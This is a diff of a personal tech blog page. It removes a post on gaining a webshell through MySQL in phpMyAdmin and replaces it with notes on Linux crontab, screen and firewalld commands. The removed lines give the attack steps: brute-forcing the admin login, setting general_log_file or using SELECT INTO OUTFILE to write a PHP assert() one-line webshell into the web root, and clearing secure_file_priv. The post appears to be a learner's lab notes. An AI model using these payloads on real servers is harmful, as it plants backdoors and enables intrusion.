@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="mysql写getshell--phpmyadmin, 二层楼">
+    <meta name="keywords" content="linux　计时任务, 二层楼">
     <meta name="description" content="荒原初见，悠悠我心，雪夜红墙，要你欢喜">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>mysql写getshell--phpmyadmin | 二层楼</title>
+    <title>linux　计时任务 | 二层楼</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -403,12 +403,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">mysql写getshell--phpmyadmin</h1>
+                    <h1 class="description center-align post-title">linux　计时任务</h1>
                 </div>
             </div>
         </div>
@@ -536,7 +536,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-18
+                    2021-06-08
                 </div>
                 
 
@@ -557,30 +557,24 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="利用mysql-语句写webshell"><a href="#利用mysql-语句写webshell" class="headerlink" title="利用mysql 语句写webshell"></a>利用mysql 语句写webshell</h3><h4 id="利用爆破拿到phpmyadmin-的管理员账号密码"><a href="#利用爆破拿到phpmyadmin-的管理员账号密码" class="headerlink" title="利用爆破拿到phpmyadmin 的管理员账号密码"></a>利用爆破拿到phpmyadmin 的管理员账号密码</h4><p>通过信息收集，查看配置信息 </p>
-<p>绝对路径<br>C:/phpStudy/PHPTutorial/</p>
-<p>方法一<br>通过日志写入webshell</p>
-<p>查询日志设置<br>show variables like “%general%”<br><img src="/images/pasted-45.png" alt="upload successful"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;</span><br><span class="line">set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;indes.php&#39;</span><br></pre></td></tr></table></figure>
-<p>错误操作</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php assert($_POST[&quot;pass&quot;]);?&gt;&#39;</span><br></pre></td></tr></table></figure>
-<p>正确操作</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php assert($_REQUEST[&quot;pass&quot;]);?&gt;&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/pasted-46.png" alt="upload successful"><br>方法二</p>
-<p>直接写入webshell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php assert($_REQUEST[&quot;pass&quot;]);?&gt;&#39; INTO OUTFILE &#39;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;indes3.php&#39;</span><br></pre></td></tr></table></figure>
-<p>报错：<br><img src="/images/pasted-47.png" alt="upload successful"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;%secure%&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/pasted-48.png" alt="upload successful"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global secure_auth&#x3D;&#39;on&#39;</span><br></pre></td></tr></table></figure>
-<p>在次写入仍然报错<br>需要把</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Secure_file_priv&#x3D;””</span><br></pre></td></tr></table></figure>
-<p>添加到 my.ini配置文件中<br><img src="/images/pasted-49.png" alt="upload successful"><br>重启phpstudy</p>
-<p>重新写入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php assert($_REQUEST[&quot;pass&quot;]);?&gt;&#39; INTO OUTFILE &#39;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;indes3.php&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/pasted-50.png" alt="upload successful"></p>
-<p>注意：<br>有些时候斜杠会被转义，需要用双斜杠<br>需要</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php assert($_REQUEST[&quot;pass&quot;]);?&gt;&#39; INTO OUTFILE &#39;C:&#x2F;&#x2F;phpStudy&#x2F;&#x2F;PHPTutorial&#x2F;&#x2F;WWW&#x2F;&#x2F;indes3.php&#39;</span><br></pre></td></tr></table></figure>
+                <h3 id="linux-计时任务"><a href="#linux-计时任务" class="headerlink" title="linux　计时任务"></a>linux　计时任务</h3><p>crontab任务计划用于周期性执行程序。</p>
+<p>1）查看crontab服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status crond</span><br></pre></td></tr></table></figure>
+<p>2）任务计划格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">*(分)*(时)*(日)*(月)*(周)  周期执行的程序</span><br><span class="line">#最长是每年，最短是每分</span><br><span class="line">30 22 * * 6 time.sh</span><br><span class="line">#每周六晚上22:30分执行time.sh脚本</span><br><span class="line"> </span><br><span class="line">30 22 * * 1,3,5 time.sh</span><br><span class="line">#每周一，周三，周五晚上22:30分执行time.sh脚本</span><br><span class="line"> </span><br><span class="line">30 22 * * 1-5 time.sh</span><br><span class="line">#每周的周一到周五晚上22:30分执行time.sh脚本</span><br><span class="line"> </span><br><span class="line">* * * * * time.sh</span><br><span class="line">#每分钟执行一次time.sh脚本</span><br><span class="line"> </span><br><span class="line">*&#x2F;5 * * * * time.sh</span><br><span class="line">#每5分钟执行一次time.sh脚本</span><br><span class="line"> </span><br><span class="line">00 00 * * * time.sh</span><br><span class="line">#每天晚上0点执行time.sh脚本</span><br></pre></td></tr></table></figure>
+<p>3）查看cron任务计划</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
+<p>4）编辑cron任务计划</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
+<p>5）删除所有cron任务计划</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -r</span><br></pre></td></tr></table></figure>
+<h3 id="扩展screen"><a href="#扩展screen" class="headerlink" title="扩展screen"></a>扩展screen</h3><p>安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install epel-release</span><br><span class="line"></span><br><span class="line">sudo yum install screen</span><br><span class="line"></span><br><span class="line">常用screen参数</span><br><span class="line"></span><br><span class="line">screen -S session_name           # 新建一个叫session_name的session</span><br><span class="line">screen -ls（或者screen -list）   # 列出当前所有的session</span><br><span class="line">screen -r session_name            # 回到session_name这个session</span><br><span class="line">screen -d session_name           # 远程detach某个session</span><br><span class="line">screen -d -r session_name        # 结束当前session并回到session_name这个session</span><br><span class="line">在每个screen session 下，命令都以 ctrl+a、ctrl-a，常用的几个操作如下：</span><br><span class="line"></span><br><span class="line">ctrl-a x   # 锁住当前的shell window，需用用户密码解锁</span><br><span class="line">ctrl-a d   # detach，暂时离开当前session，将当前 screen session 转到后台执行，并会返回没进 screen 时的状态，此时在 screen session 里，每个shell client内运行的 process (无论是前台&#x2F;后台)都在继续执行，即使 logout 也不影响</span><br><span class="line">ctrl-a z   # 把当前session放到后台执行，用 shell 的 fg 命令则可回去。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>开机启动</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files</span><br><span class="line"></span><br><span class="line">左边是服务名称，右边是状态，enabled是开机启动，disabled是开机不启动</span><br><span class="line"></span><br><span class="line">systemctl list-unit-files | grep enable</span><br><span class="line"></span><br><span class="line">设置开机自启项</span><br><span class="line">systemctl enable redis</span><br></pre></td></tr></table></figure>
+
+<h3 id="Centos8开放防火墙端口"><a href="#Centos8开放防火墙端口" class="headerlink" title="Centos8开放防火墙端口"></a>Centos8开放防火墙端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">查看防火墙某个端口是否开放</span><br><span class="line">firewall-cmd --query-port&#x3D;3306&#x2F;tcp</span><br><span class="line">开放防火墙端口3306</span><br><span class="line">firewall-cmd --zone&#x3D;public --add-port&#x3D;3306&#x2F;tcp --permanent</span><br><span class="line">注意：开放端口后要重启防火墙生效</span><br><span class="line">重启防火墙</span><br><span class="line">systemctl restart firewalld</span><br><span class="line">关闭防火墙端口</span><br><span class="line">firewall-cmd --remove-port&#x3D;3306&#x2F;tcp --permanent</span><br><span class="line">查看防火墙状态</span><br><span class="line">systemctl status firewalld</span><br><span class="line">关闭防火墙</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">打开防火墙</span><br><span class="line">systemctl start firewalld</span><br><span class="line">开放一段端口</span><br><span class="line">firewall-cmd --zone&#x3D;public --add-port&#x3D;40000-45000&#x2F;tcp --permanent</span><br><span class="line">查看开放的端口列表</span><br><span class="line">firewall-cmd --zone&#x3D;public --list-ports</span><br><span class="line">查看被监听(Listen)的端口</span><br><span class="line">netstat -lntp</span><br><span class="line">检查端口被哪个进程占用</span><br><span class="line">netstat -lnp|grep 3306</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
                 
             </div>
             <hr/>
@@ -606,7 +600,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://thirteensummer.github.io/2021/05/18/mysql-xie-getshell-phpmyadmin/">https://thirteensummer.github.io/2021/05/18/mysql-xie-getshell-phpmyadmin/</a>
+                    <a href="https://thirteensummer.github.io/2021/06/08/linux-ji-shi-ren-wu/">https://thirteensummer.github.io/2021/06/08/linux-ji-shi-ren-wu/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -811,9 +805,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/06/08/linux-ji-shi-ren-wu/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="linux　计时任务">
+                        
+                        <span class="card-title">linux　计时任务</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-08
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            thirteensummer
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2021/06/07/linux-chang-yong-ming-ling/">
                     <div class="card-image">
@@ -831,45 +864,8 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-07
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            thirteensummer
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/03/31/ru-qin-jian-ce-windows/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="入侵检测-windows">
-                        
-                        <span class="card-title">入侵检测-windows</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-31
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-07
                             </span>
                         <span class="publish-author">
                             
@@ -878,18 +874,6 @@
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E5%8A%A0%E5%AF%86/">
-                        <span class="chip bg-color">加密</span>
-                    </a>
-                    
-                    <a href="/tags/windows/">
-                        <span class="chip bg-color">windows</span>
-                    </a>
-                    
                 </div>
                 
             </div>
